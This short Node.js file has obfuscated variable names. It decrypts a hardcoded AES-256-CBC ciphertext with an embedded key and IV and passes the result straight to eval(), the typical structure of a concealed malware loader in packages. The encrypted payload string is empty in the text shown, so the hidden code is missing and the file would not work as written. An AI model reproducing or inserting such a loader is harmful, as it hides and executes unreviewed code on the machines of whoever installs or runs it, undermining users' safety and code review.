const ito = require('crypto');
const itinho = Buffer.from('0939c39b70a0f98242e6bda53ee5ca8dc164c9f7fc32145fcff7c0fb7f2d436e', 'hex');
const octua = Buffer.from('fe31424c631b96f71f88bbe97f5e3a08', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
